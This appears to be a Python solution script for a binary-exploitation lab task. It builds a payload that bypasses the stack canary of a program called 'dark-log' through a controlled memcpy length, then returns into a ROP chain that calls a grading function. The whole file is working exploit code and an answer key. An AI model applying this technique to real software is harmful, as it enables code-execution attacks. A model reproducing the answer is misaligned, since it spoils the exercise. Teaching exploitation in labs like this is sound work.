#!/usr/bin/env python3
"""Task 4: bypass dark-log's canary with a controlled memcpy length."""

import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


POP_RDI_RET = 0x4018A3
GRADE_EVAL = 0x401677

rop_chain = p64(POP_RDI_RET) + p64(4) + p64(GRADE_EVAL)
chain_source = rop_chain + b"A" * (128 - len(rop_chain))

payload = (
    chain_source
    + b"B" * 128
    + struct.pack("<I", 0xA8)
)

sys.stdout.buffer.write(payload)
